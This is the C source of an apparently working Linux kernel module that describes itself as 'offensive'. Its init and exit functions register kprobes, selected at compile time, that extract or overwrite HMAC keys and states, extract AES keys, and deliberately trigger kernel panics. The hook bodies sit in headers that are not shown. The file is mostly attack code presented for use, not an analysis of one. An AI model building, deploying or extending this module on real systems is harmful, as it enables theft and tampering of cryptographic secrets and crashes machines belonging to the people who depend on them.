#include "headers/main_header.h"
#include "headers/custom_header.h"


static int __init init_func(void){
    int ret = 0;

    ret = obliviate_permission_check();
    if(ret < 0){
        #if DEBUG_MODE
        pr_info("You have no permission!\n");
        #endif
        return ret;
    }

    #if defined(__DISABLE_EXPORTS)
    #error("You can't hooked the __hmac_sha256_preparekey function!");
    #endif

    /*
    *   - General warning!
    *       - The safest method is reveal_the_key
    *       - Other methods are highly unsafe(hardcoded offsets)
    *
    *   - Optimization:
    *       - Limits to compiler time warning.
    *       - It does not waste CPU cycles writing our msg on runtime.
    */
    #if (OB_SUPPORT(!=, 6, 17, 0))
    #if (CHANGE_THE_HMAC_KEY || REVEAL_THE_HMAC_STATES || CHANGE_THE_HMAC_STATES \
        || REVEAL_THE_AES_KEY || FREE_KERNEL_PANIC)
    #warning"This module uses hardcoded offsets. Proceed at your own risk.!"
    #endif
    #endif

    #if (!REVEAL_THE_HMAC_KEY || !REVEAL_THE_AES_KEY)
    ret = resolve_the_kallsyms();
    if(ret < 0){
        #if DEBUG_MODE
        pr_err("Get kallsyms_lookup_name failed! \n");
        return ret;
        #endif
    }
    #endif

    #if (REVEAL_THE_HMAC_KEY || CHANGE_THE_HMAC_KEY)
    ret = register_extract_or_change_key_kprobe();
    if(ret < 0){
        #if DEBUG_MODE
        pr_err("Kprobe registeration failed!\n");
        #endif
        return ret;
    }
    #endif

    #if (REVEAL_THE_AES_KEY || FREE_KERNEL_PANIC)
    ret = register_aes_key_extractor();
    if(ret < 0){
        #if DEBUG_MODE
        pr_err("Kprobe registeration failed!\n");
        #endif
    }
    #endif

    #if REVEAL_THE_HMAC_STATES
        ret = register_reveal_the_hmac_state_kprobe();
        if(ret < 0){
            #if DEBUG_MODE
            pr_err("Kprobe registeration failed!\n");
            #endif
        }
    #endif

    #if UNFORGIVABLE_KERNEL_CURSE
    ret = register_composite_approach();
    if(ret < 0){
        #if DEBUG_MODE
        pr_err("Kprobe registeration failed!\n");
        #endif
    }
    #endif

    return ret;
}

static void __exit exit_func(void){
    #if (REVEAL_THE_HMAC_KEY || CHANGE_THE_HMAC_KEY)
    unregister_extract_or_change_key_kprobe();
    #endif

    #if (REVEAL_THE_AES_KEY || FREE_KERNEL_PANIC)
    unregister_aes_key_extractor();
    #endif

    #if REVEAL_THE_HMAC_STATES
    unregister_reveal_the_hmac_state_kprobe();
    #endif

    #if UNFORGIVABLE_KERNEL_CURSE
    unregister_composite_approach();
    #endif
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ravindu Priyankara");
MODULE_DESCRIPTION("Offensive kernel module, that extract & modify the cryptographic keys.");
MODULE_VERSION("1.0");

module_init(init_func);
module_exit(exit_func);